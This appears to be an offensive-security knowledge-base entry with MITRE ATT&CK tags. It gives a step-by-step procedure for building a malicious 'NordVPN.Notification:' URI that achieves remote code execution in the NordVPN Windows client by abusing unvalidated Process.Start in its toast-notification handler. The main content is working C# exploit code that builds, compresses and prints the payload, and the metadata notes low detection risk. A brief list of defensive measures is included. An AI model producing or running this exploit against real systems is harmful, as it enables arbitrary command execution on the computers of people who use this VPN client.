---
tags:
  - rce
  - payload-craft
  - command-injection
type: procedure
tools:
  - '[[tools/Newtonsoft-Json]]'
  - '[[tools/NordVpn-Core]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/generate-nordvpn-malicious-payload]]'
platforms:
  - Windows
techniques:
  - '[[Windows Command Shell]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 1232c28d-2f78-4259-a08b-209a83087d84
created_at: '2025-12-14T17:24:08.521Z'
updated_at: '2025-12-14T17:24:08.521Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Craft-Malicious-NordVPN-Notification-Payload

## Summary

This procedure crafts a compressed malicious notification payload for the NordVPN Windows client's custom 'NordVPN.Notification:' URI scheme, setting an 'OpenUrl' argument to an arbitrary command that will be executed via Process.Start without validation.

## Description

The NordVPN client registers custom URI schemes for inter-process communication, vulnerable due to the 'NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl.OnInteraction' method deserializing payloads and calling Process.Start on user-controlled data. This procedure uses C# with NordVPN's own libraries to create a NotificationActionArgs object, compress it, and format it as a URI. The target environment is a Windows machine with .NET and the NordVPN DLLs available (extracted from the client installation). Expected outcome: A valid URI payload that triggers RCE upon processing.

## Requirements

1. Windows environment with .NET Framework
2. Access to NordVpn.Core.dll (from NordVPN installation directory)
3. Newtonsoft.Json.dll for serialization support
4. C# compiler or runtime (e.g., Visual Studio or dotnet CLI)

## Defense

Defensive measures and detection strategies:

- Disable or restrict custom URI scheme handling in applications
- Implement input validation and sanitization on deserialized payloads
- Monitor for unexpected Process.Start calls via ETW logging or Sysmon
- Educate users to deny unknown application launch prompts from browsers

## Objectives

1. Generate a deserializable payload embedding an arbitrary command
2. Compress and encode it for URI transmission
3. Ensure compatibility with NordVPN's ObjectCompressor for seamless exploitation

## Instructions

### Step 1: Prepare Environment and Import Libraries

**Context**: Set up a C# script environment by referencing the required DLLs from the NordVPN installation (typically in C:\Program Files\NordVPN\).

Copy Newtonsoft.Json.dll and NordVpn.Core.dll to your working directory.

### Step 2: Execute Payload Generation

**Context**: Run the C# code to create the dictionary with 'OpenUrl' set to the target command (e.g., 'calc.exe'), instantiate NotificationActionArgs, compress it, and output the URI.

**Command** ([[commands/generate-nordvpn-malicious-payload]]):
```csharp
using System; using System.Collections.Generic; using Newtonsoft.Json; using NordVpn.Core; Dictionary<string,string> arguments = new Dictionary<string,string>(); arguments["OpenUrl"]="calc.exe"; NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments); String exploit = ObjectCompressor.CompressObject(toastArgs); Console.Write(String.Format("NordVPN.Notification:{0}", exploit)); Console.ReadKey();
```

> This command imports necessary namespaces, builds the arguments dictionary, constructs the notification args, compresses using NordVPN's compressor, and prints the formatted URI. Expected output is the base64-like compressed string prefixed with 'NordVPN.Notification:'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/generate-nordvpn-malicious-payload]]

## Tools Used

- [[tools/Newtonsoft-Json]]
- [[tools/NordVpn-Core]]

## Tags

- rce
- payload-craft
- command-injection
